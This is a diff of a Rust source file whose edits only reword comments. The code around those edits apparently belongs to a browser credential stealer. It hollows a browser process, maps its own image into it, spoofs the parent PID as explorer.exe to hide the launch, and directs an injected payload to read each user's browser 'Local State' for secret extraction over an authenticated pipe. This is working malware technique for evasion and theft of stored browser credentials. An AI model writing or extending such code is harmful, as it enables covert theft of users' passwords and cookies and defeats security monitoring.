@@ -37,8 +37,8 @@ const MAILBOX_BASE: usize = 0x1_0000_0000;
 /// live-but-stuck payload (e.g. a hung RPC call).
 const EXCHANGE_TIMEOUT: Duration = Duration::from_secs(60);
 
-/// Minimal environment for the hollowed child: a custom block REPLACES the
-/// parent environment — inheriting it wholesale would hand the payload our
+/// Minimal environment for the hollowed child. A custom block REPLACES the
+/// parent environment; inheriting it wholesale would hand the payload our
 /// variables, credentials and proxy settings.
 const CHILD_ENV_ALLOWLIST: &[&str] = &[
     "SYSTEMROOT",
@@ -71,8 +71,8 @@ pub struct HollowExtraction {
 /// hollowed instance of that browser.
 ///
 /// # Errors
-/// Propagates every stage's failure — the caller falls back to local
-/// plaintext-only collection; this path must never panic.
+/// Propagates every stage's failure; the caller falls back to local
+/// plaintext-only collection. This path must never panic.
 pub fn extract_via_hollow(
     browser: &Browser,
     opts: &RunOptions,
@@ -132,8 +132,8 @@ fn attempt(
     run_stages(browser, opts, image, exe, &child, listener, &pipe_name)
 }
 
-/// The shell's PID (for parent spoofing), via the taskbar window — the
-/// browser appears launched by the shell rather than by us.
+/// The shell's PID for parent spoofing, found via the taskbar window, so
+/// the browser appears launched by the shell rather than by us.
 fn explorer_pid() -> Option<u32> {
     use windows_sys::Win32::UI::WindowsAndMessaging::{FindWindowW, GetWindowThreadProcessId};
     // SAFETY: class-name wide string is valid; a missing window yields null.
@@ -148,7 +148,7 @@ fn explorer_pid() -> Option<u32> {
 }
 
 fn wide_class() -> Vec<u16> {
-    // "Shell_TrayWnd" — the taskbar window class owned by explorer.exe.
+    // "Shell_TrayWnd", the taskbar window class owned by explorer.exe.
     "Shell_TrayWnd"
         .encode_utf16()
         .chain(std::iter::once(0))
@@ -165,8 +165,8 @@ fn run_stages(
     listener: Listener,
     pipe_name: &str,
 ) -> anyhow::Result<HollowExtraction> {
-    // Map our own executable as a genuine SEC_IMAGE view — section-backed
-    // (MEM_IMAGE), which the OS loader fully accepts. The browser's original
+    // Map our own executable as a genuine SEC_IMAGE view (section-backed,
+    // MEM_IMAGE), which the OS loader fully accepts. The browser's original
     // image stays mapped (some loader paths reference the initial section);
     // the PEB image base below is what makes OUR image the executable.
     let base = proc::map_image(child, exe, image.preferred_base() as *mut std::ffi::c_void)
@@ -177,7 +177,7 @@ fn run_stages(
     // per-user user-data root, and the run options as JSON. The token
     // authenticates every pipe frame; the root travels with the request
     // because discovery is per-user (elevated runs see every user's
-    // profiles) — the payload must read THAT user's `Local State`.
+    // profiles); the payload must read THAT user's `Local State`.
     let token = run_token();
     let options_json = serde_json::to_string(opts).context("serialize run options")?;
     let blob = postbox::encode_blob(&token, &browser.user_data, &options_json);
@@ -205,8 +205,8 @@ fn run_stages(
         u64::from(image.size_of_image()),
     );
     if result.is_err() {
-        // The payload may have posted a fatal reason in the mailbox (e.g. an
-        // unreachable pipe) — surface it for diagnostics.
+        // The payload may have posted a fatal reason in the mailbox (an
+        // unreachable pipe, say); surface it for diagnostics.
         if let Ok(reason) = read_mailbox_response(child, mailbox) {
             if !reason.is_empty() {
                 return result.map_err(|e| {
@@ -221,10 +221,11 @@ fn run_stages(
     result
 }
 
-/// Drives the reader with a hard deadline, watching for early payload exit:
-/// a payload that crashed at startup never connects, and waiting out the
-/// deadline per browser would be wasteful — so the exit code is polled every
-/// ~10 ms alongside instruction-pointer samples that bracket a crash site.
+/// Drives the reader with a hard deadline while watching for early payload
+/// exit. A payload that crashed at startup never connects, and waiting out
+/// the full deadline per browser would be wasteful, so the exit code is
+/// polled every ~10 ms alongside instruction-pointer samples that bracket a
+/// crash site.
 /// On deadline, a throwaway self-connect releases an accept-stage wait.
 fn read_stream(
     mut listener: Listener,
